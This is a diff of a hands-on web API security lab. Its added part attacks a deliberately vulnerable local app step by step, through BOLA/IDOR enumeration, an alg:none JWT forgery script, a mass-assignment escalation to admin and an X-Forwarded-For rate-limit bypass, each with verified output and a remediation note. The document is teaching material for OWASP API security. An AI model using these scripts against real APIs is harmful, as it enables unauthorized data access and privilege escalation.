-  Attack: Find hidden admin mutations, sensitive fields, internal types
-
-[Issue 2] Batching attack (rate limit bypass)
-  One HTTP request = 100 login attempts → bypasses rate limiter!
-
-[Issue 3] Deeply nested queries
-  Database: 8 JOINs per request, exponential data fetching = DoS
-```
-
-### Step 8: Capstone — API Security Hardening
-
-```bash
-docker run --rm zchencow/innozverse-cybersec:latest python3 -c "
-import json
-
-api_security_policy = {
-    'authentication': {
-        'jwt_algorithm': 'RS256 (asymmetric) — server-side algorithm enforcement',
-        'jwt_expiry': '15 minutes access token, 7 days refresh token',
-        'api_keys': 'For machine-to-machine, rotate every 90 days',
-        'mfa': 'Required for admin API endpoints',
-    },
-    'authorisation': {
-        'bola': 'Every endpoint verifies object ownership before returning data',
-        'function_auth': 'Role check decorator on every route — no exceptions',
-        'mass_assignment': 'Explicit allowlist of updatable fields per endpoint',
-    },
-    'data_exposure': {
-        'response_schema': 'Pydantic response_model on every endpoint',
-        'pii_logging': 'Mask PII in logs (email → al***@corp.com)',
-        'error_format': 'Generic errors with correlation ID — no stack traces',
-    },
-    'rate_limiting': {
-        'auth_endpoints': '5 req/15min per IP + API key',
-        'public_api': '100 req/min per API key',
-        'admin_api': '20 req/min per session',
-    },
-    'transport': {
-        'tls': 'TLS 1.3 only, HSTS with preload',
-        'certificates': 'Short-lived certs (90 days), auto-renew',
-    },
+    "app": "InnoZverse API v2",
+    "version": "2.3.1"
 }
-
-print('API Security Policy — InnoZverse API v2:')
-print()
-for category, controls in api_security_policy.items():
-    print(f'  [{category.upper()}]')
-    for key, value in controls.items():
-        print(f'    {key:<20}: {value}')
-    print()
-
-print('OWASP API Security Top 10 coverage:')
-coverage = [
-    ('API1: BOLA',                   '✓ Object ownership check on all endpoints'),
-    ('API2: Broken Auth',            '✓ JWT RS256, short expiry, MFA for admin'),
-    ('API3: Broken Object Prop Auth','✓ Pydantic response_model, explicit allowlists'),
-    ('API4: Unrestricted Resource',  '✓ Rate limiting per endpoint + user'),
-    ('API5: Function Auth',          '✓ Role decorator on every route'),
-    ('API6: Unrestricted Access',    '✓ Business flow validation'),
-    ('API7: Server Side Request',    '✓ SSRF controls (Lab 10)'),
-    ('API8: Security Misconfig',     '✓ Hardened headers, no debug mode'),
-    ('API9: Improper Inventory',     '✓ OpenAPI spec + automated discovery'),
-    ('API10: Unsafe API Consumption','✓ Validate all third-party API responses'),
-]
-for vuln, status in coverage:
-    print(f'  [✓] {vuln:<35} {status}')
-"
 ```
 
 ---
 
-## Summary
+### Step 2: Launch the Kali Attacker Container
 
-| API Vulnerability | Attack | Fix |
-|------------------|--------|-----|
-| JWT alg:none | Forge token without signature | Server-side algorithm enforcement |
-| BOLA | Access other users' resources | Object ownership check on every request |
-| Mass assignment | Escalate privileges via extra fields | Explicit field allowlist per operation |
-| Excessive data exposure | PII/secrets in response | Pydantic response_model schema |
-| Missing function auth | Access admin endpoints | Role decorator on every route |
-| No rate limiting | Brute-force, enumeration | Per-endpoint per-user rate limits |
+```bash
+docker run --rm -it \
+  --name kali-attacker \
+  --network lab-a12 \
+  zchencow/innozverse-kali:latest bash
+```
+
+Set target and run initial recon:
+
+```bash
+export TARGET="http://victim-a12:5000"
+
+# Fingerprint
+nmap -sV -p 5000 victim-a12
+
+# Enumerate API endpoints
+gobuster dir \
+  -u $TARGET \
+  -w /usr/share/dirb/wordlists/small.txt \
+  -t 10 --no-error -q
+```
+
+**📸 Verified Output:**
+```
+PORT     STATE SERVICE VERSION
+5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)
+
+/login                (Status: 405)
+/products             (Status: 200)
+/search               (Status: 200)
+```
+
+---
+
+### Step 3: Get a Valid Token — Authenticate as alice
+
+```bash
+echo "=== Log in as alice and capture JWT ==="
+
+ALICE_TOKEN=$(curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}' \
+  $TARGET/api/login \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+echo "Token: ${ALICE_TOKEN:0:80}..."
+echo ""
+
+# Decode the JWT payload (no secret needed — just base64)
+echo "=== Decoded JWT payload ==="
+echo $ALICE_TOKEN | python3 -c "
+import sys, base64, json
+token = sys.stdin.read().strip()
+parts = token.split('.')
+def b64d(s):
+    s += '=' * (-len(s) % 4)
+    return json.loads(base64.urlsafe_b64decode(s))
+header  = b64d(parts[0])
+payload = b64d(parts[1])
+print('Header: ', json.dumps(header))
+print('Payload:', json.dumps(payload))
+print()
+print('Observation: role=user, user_id=2')
+print('Goal: become role=admin, access user_id=1 data')
+"
+```
+
+**📸 Verified Output:**
+```
+Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1...
+
+Header:  {"alg": "HS256", "typ": "JWT"}
+Payload: {"user_id": 2, "username": "alice", "role": "user"}
+
+Observation: role=user, user_id=2
+Goal: become role=admin, access user_id=1 data
+```
+
+> 💡 **JWT payloads are base64-encoded, not encrypted.** Anyone can decode and read them without the secret. The secret only protects the signature — if the server doesn't verify the signature, the payload is fully attacker-controlled. This is why `alg:none` attacks are so powerful.
+
+---
+
+### Step 4: BOLA / IDOR — Access Any User's Orders
+
+BOLA (Broken Object Level Authorization) — the #1 OWASP API vulnerability. Alice is user_id=2, but the API lets her access orders belonging to any user_id.
+
+```bash
+echo "=== BOLA: access orders by incrementing the ID ==="
+
+# Alice's own order (user_id=2) — legitimate
+echo "[Order 1 — Alice's order]:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/orders/1 | python3 -m json.tool
+
+echo ""
+
+# Bob's order (user_id=3) — IDOR: alice reads bob's private notes
+echo "[Order 2 — BOB's order (should be blocked)]:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/orders/2 | python3 -m json.tool
+
+echo ""
+
+# Admin's order (user_id=1) — alice reads admin's order
+echo "[Order 3 — ADMIN's order (should be blocked)]:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/orders/3 | python3 -m json.tool
+
+echo ""
+echo "=== Enumerate ALL orders automatically ==="
+python3 << 'EOF'
+import urllib.request, json, os
+
+TARGET = "http://victim-a12:5000"
+
+# Get token
+req = urllib.request.Request(f"{TARGET}/api/login",
+    data=json.dumps({"username":"alice","password":"alice123"}).encode(),
+    headers={"Content-Type":"application/json"})
+token = json.loads(urllib.request.urlopen(req).read())['token']
+
+print("Enumerating orders 1..5 as alice (user_id=2):")
+for oid in range(1, 6):
+    req2 = urllib.request.Request(f"{TARGET}/api/orders/{oid}",
+        headers={"Authorization": f"Bearer {token}"})
+    try:
+        order = json.loads(urllib.request.urlopen(req2).read())
+        owner = "MINE" if order.get('user_id') == 2 else "OTHER USER'S DATA"
+        print(f"  Order {oid}: {order['product']:<25} user_id={order['user_id']}  [{owner}]")
+        if order.get('notes'):
+            print(f"           notes: {order['notes']}")
+    except:
+        print(f"  Order {oid}: not found")
+EOF
+```
+
+**📸 Verified Output:**
+```json
+[Order 1 — Alice's order]:
+{
+    "amount": 864.0, "id": 1, "notes": "ship to alice home",
+    "product": "Surface Pro 12", "user_id": 2
+}
+
+[Order 2 — BOB's order]:
+{
+    "amount": 49.99, "id": 2, "notes": "gift wrap",
+    "product": "Surface Pen", "user_id": 3
+}
+
+[Order 3 — ADMIN's order]:
+{
+    "amount": 1299.0, "id": 3, "notes": "admin test order",
+    "product": "Surface Laptop 5", "user_id": 1
+}
+
+Enumerating orders 1..5 as alice (user_id=2):
+  Order 1: Surface Pro 12           user_id=2  [MINE]
+           notes: ship to alice home
+  Order 2: Surface Pen              user_id=3  [OTHER USER'S DATA]
+           notes: gift wrap
+  Order 3: Surface Laptop 5         user_id=1  [OTHER USER'S DATA]
+           notes: admin test order
+```
+
+> 💡 **BOLA is #1 in the OWASP API Top 10 because it requires zero skill to exploit** — just change a number in the URL. The server validates the token (is the user logged in?) but not the object (does this order belong to this user?). Fix: `WHERE id=? AND user_id=?` using the user_id from the verified JWT payload — never from the request.
+
+---
+
+### Step 5: BOLA — Access Any User Profile (API Key Leak)
+
+```bash
+echo "=== BOLA on /api/users/{id} — read any user's full profile ==="
+
+# Alice reading her own profile (legitimate)
+echo "[Alice reads her own profile — user_id=2]:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/users/2 | python3 -m json.tool
+
+echo ""
+
+# Alice reading the ADMIN profile — exposes admin's API key
+echo "[Alice reads ADMIN profile — user_id=1]:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/users/1 | python3 -m json.tool
+```
+
+**📸 Verified Output:**
+```json
+[Alice reads ADMIN profile — user_id=1]:
+{
+    "api_key": "key_admin_secret_xyz",
+    "email": "admin@innozverse.com",
+    "id": 1,
+    "role": "admin",
+    "username": "admin"
+}
+```
+
+---
+
+### Step 6: JWT alg:none Attack — Forge an Admin Token
+
+```bash
+echo "=== JWT alg:none: forge an admin token without knowing the secret ==="
+
+python3 << 'EOF'
+import base64, json, urllib.request
+
+TARGET = "http://victim-a12:5000"
+
+def b64url(data):
+    if isinstance(data, str): data = data.encode()
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+# Step 1: set alg=none in header
+header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}))
+
+# Step 2: claim to be admin with user_id=1
+payload = b64url(json.dumps({"user_id": 1, "username": "admin", "role": "admin"}))
+
+# Step 3: empty signature — no secret needed
+forged_token = f"{header}.{payload}."
+
+print(f"[*] Forged token: {forged_token[:100]}...")
+print()
+
+# Step 4: use forged token to access admin's profile
+req = urllib.request.Request(
+    f"{TARGET}/api/users/1",
+    headers={"Authorization": f"Bearer {forged_token}"})
+resp = json.loads(urllib.request.urlopen(req).read())
+
+print("[!] Admin profile accessed with FORGED token (no password, no secret):")
+for k, v in resp.items():
+    print(f"    {k}: {v}")
+EOF
+```
+
+**📸 Verified Output:**
+```
+[*] Forged token: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1...
+
+[!] Admin profile accessed with FORGED token (no password, no secret):
+    id: 1
+    username: admin
+    email: admin@innozverse.com
+    role: admin
+    api_key: key_admin_secret_xyz
+```
+
+> 💡 **The `alg:none` attack works because the server reads `alg` from the token header — which the attacker controls.** When `alg=none`, the server skips signature verification entirely. Fix: never read the algorithm from the token. Hardcode it server-side: `if header['alg'] != 'HS256': reject`. Use a well-maintained JWT library that handles this for you (e.g., `python-jose`, `authlib`).
+
+---
+
+### Step 7: Mass Assignment — Escalate Role from user to admin
+
+```bash
+echo "=== Mass assignment: send 'role' field to escalate privileges ==="
+
+echo "[Before attack — Alice is 'user']:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/users/2 | python3 -c "
+import sys,json; d=json.load(sys.stdin)
+print(f'  username={d[\"username\"]}  role={d[\"role\"]}  email={d[\"email\"]}')"
+
+echo ""
+echo "[Sending update with role=admin in the body]:"
+curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $ALICE_TOKEN" \
+  -d '{"role":"admin","email":"hacked@evil.com"}' \
+  $TARGET/api/users/2 | python3 -m json.tool
+
+echo ""
+echo "[After attack — Alice is now 'admin']:"
+curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
+  $TARGET/api/users/2 | python3 -c "
+import sys,json; d=json.load(sys.stdin)
+print(f'  username={d[\"username\"]}  role={d[\"role\"]}  email={d[\"email\"]}')"
+```
+
+**📸 Verified Output:**
+```
+[Before attack — Alice is 'user']:
+  username=alice  role=user  email=alice@corp.com
+
+[Sending update with role=admin in the body]:
+{
+    "api_key": "key_alice_abc123",
+    "email": "hacked@evil.com",
+    "id": 2,
+    "role": "admin",
+    "username": "alice"
+}
+
+[After attack — Alice is now 'admin']:
+  username=alice  role=admin  email=hacked@evil.com
+```
+
+> 💡 **Mass assignment happens when the server blindly maps client-supplied JSON fields directly onto the data model.** The developer wrote a generic "update user" handler that accepts any field — including `role`, `api_key`, and `username`. Fix: use an explicit allowlist of fields that users may update: `allowed = {'email', 'password'}; safe_data = {k:v for k,v in data.items() if k in allowed}`.
+
+---
+
+### Step 8: Excessive Data Exposure
+
+```bash
+echo "=== Excessive data exposure: public products endpoint leaks internal fields ==="
+
+curl -s $TARGET/api/products | python3 -c "
+import sys, json
+products = json.load(sys.stdin)
+print('Public /api/products response includes INTERNAL fields:')
+for p in products:
+    print(f\"\n  {p['name']} (retail: \${p['price']})\")
+    print(f\"    cost:            \${p['cost']}  (margin: \${p['price']-p['cost']:.2f})\")
+    print(f\"    supplier_secret: {p['supplier_secret']}  <-- should NEVER be public\")
+"
+```
+
+**📸 Verified Output:**
+```
+Public /api/products response includes INTERNAL fields:
+
+  Surface Pro 12 (retail: $864.0)
+    cost:            $420.0  (margin: $444.00)
+    supplier_secret: SUPPLIER-SECRET-A  <-- should NEVER be public
+
+  Surface Laptop 5 (retail: $1299.0)
+    cost:            $650.0  (margin: $649.00)
+    supplier_secret: SUPPLIER-SECRET-B  <-- should NEVER be public
+
+  Surface Pen (retail: $49.99)
+    cost:            $8.0  (margin: $41.99)
+    supplier_secret: SUPPLIER-SECRET-C  <-- should NEVER be public
+```
+
+---
+
+### Step 9: Broken Function Level Authorization + Rate Limit Bypass
+
+```bash
+echo "=== Broken Function Level Auth: internal endpoint — no token required ==="
+
+# No Authorization header at all — full user dump including API keys
+curl -s $TARGET/api/internal/users | python3 -m json.tool
+
+echo ""
+echo "=== Rate limit bypass via X-Forwarded-For header spoofing ==="
+
+echo "Hitting /api/search normally (limit: 5 per 10s):"
+for i in $(seq 1 6); do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/search?q=Surface")
+  echo "  Request $i (real IP): HTTP $code $([ "$code" = "429" ] && echo "<-- BLOCKED")"
+done
+
+echo ""
+echo "Bypassing rate limit by spoofing X-Forwarded-For per request:"
+for i in $(seq 1 6); do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    -H "X-Forwarded-For: 10.10.10.$i" \
+    "$TARGET/api/search?q=Surface")
+  echo "  Request $i (spoofed IP=10.10.10.$i): HTTP $code"
+done
+```
+
+**📸 Verified Output:**
+```
+[
+    {"api_key": "key_admin_secret_xyz", "email": "admin@innozverse.com", "id": 1, "role": "admin", "username": "admin"},
+    {"api_key": "key_alice_abc123",     "email": "alice@corp.com",        "id": 2, "role": "user",  "username": "alice"},
+    {"api_key": "key_bob_def456",       "email": "bob@email.com",         "id": 3, "role": "user",  "username": "bob"}
+]
+
+Hitting /api/search normally (limit: 5 per 10s):
+  Request 1 (real IP):          HTTP 200
+  Request 2 (real IP):          HTTP 200
+  Request 3 (real IP):          HTTP 200
+  Request 4 (real IP):          HTTP 200
+  Request 5 (real IP):          HTTP 200
+  Request 6 (real IP):          HTTP 429 <-- BLOCKED
+
+Bypassing rate limit by spoofing X-Forwarded-For per request:
+  Request 1 (spoofed IP=10.10.10.1): HTTP 200
+  Request 2 (spoofed IP=10.10.10.2): HTTP 200
+  Request 3 (spoofed IP=10.10.10.3): HTTP 200
+  Request 4 (spoofed IP=10.10.10.4): HTTP 200
+  Request 5 (spoofed IP=10.10.10.5): HTTP 200
+  Request 6 (spoofed IP=10.10.10.6): HTTP 200
+```
+
+> 💡 **`X-Forwarded-For` is set by load balancers and proxies — but any client can set it too.** Rate limiting purely on this header is bypassable by anyone. Fix: rate limit on the authenticated `user_id` from the JWT payload (not the IP), and combine with IP-level limiting using the verified IP from the actual TCP connection (`request.remote_addr`), not the header.
+
+---
+
+### Step 10: Cleanup
+
+```bash
+exit  # Exit Kali
+```
+
+```bash
+docker rm -f victim-a12
+docker network rm lab-a12
+```
+
+---
+
+## Attack Summary
+
+| Attack | OWASP API | Endpoint | Result |
+|--------|-----------|----------|--------|
+| BOLA on orders | API1:2023 | `GET /api/orders/{id}` | Read all users' orders and private notes |
+| BOLA on users | API1:2023 | `GET /api/users/{id}` | Read admin profile + API key |
+| JWT alg:none | API2:2023 | All authenticated endpoints | Forged admin token, no secret needed |
+| Mass assignment | API3:2023 | `POST /api/users/{id}/update` | Escalated role from `user` to `admin` |
+| Excessive data exposure | API3:2023 | `GET /api/products` | Cost prices + supplier secrets exposed |
+| Broken function auth | API5:2023 | `GET /api/internal/users` | All users + API keys, zero auth |
+| Rate limit bypass | API4:2023 | `GET /api/search` | Unlimited requests via spoofed IP header |
+
+---
+
+## Remediation
+
+### BOLA Fix — Always filter by authenticated user
+```python
+# Broken
+order = db.execute('SELECT * FROM orders WHERE id=?', (order_id,)).fetchone()
+
+# Fixed
+order = db.execute(
+    'SELECT * FROM orders WHERE id=? AND user_id=?',
+    (order_id, payload['user_id'])   # user_id from verified JWT, not request
+).fetchone()
+```
+
+### JWT Fix — Hardcode the algorithm
+```python
+# Broken: trusts header.alg
+alg = header.get('alg', '').lower()
+if alg == 'none': return payload  # catastrophic
+
+# Fixed: always HS256, never trust client
+EXPECTED_ALG = 'hs256'
+if header.get('alg','').lower() != EXPECTED_ALG:
+    return None  # reject anything that isn't HS256
+```
+
+### Mass Assignment Fix — Explicit allowlist
+```python
+# Broken
+for field, value in data.items():
+    db.execute(f'UPDATE users SET {field}=? WHERE id=?', (value, user_id))
+
+# Fixed
+ALLOWED_USER_FIELDS = {'email', 'display_name'}
+safe = {k: v for k, v in data.items() if k in ALLOWED_USER_FIELDS}
+for field, value in safe.items():
+    db.execute(f'UPDATE users SET {field}=? WHERE id=?', (value, user_id))
+```
+
+### Excessive Data Exposure Fix — Explicit field selection
+```python
+# Broken: SELECT * returns everything
+rows = db.execute('SELECT * FROM products').fetchall()
+
+# Fixed: only return public-facing fields
+rows = db.execute('SELECT id, name, price FROM products').fetchall()
+```
+
+### Rate Limit Fix — Limit by user_id, not IP
+```python
+# Broken: trusts X-Forwarded-For (client-controlled)
+ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+# Fixed: use JWT user_id (attacker can't spoof this)
+payload = verify_jwt(token)
+rate_key = f"user:{payload['user_id']}"
+# Also add IP from actual TCP connection as secondary limit
+ip_key = f"ip:{request.remote_addr}"  # real TCP connection IP
+```
 
 ## Further Reading
-- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
-- [PortSwigger API Testing](https://portswigger.net/web-security/api-testing)
-- [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
+- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
+- [PortSwigger API Testing Labs](https://portswigger.net/web-security/api-testing)
+- [JWT alg:none — Critical Vulnerabilities in JWT Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
+- [BOLA — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
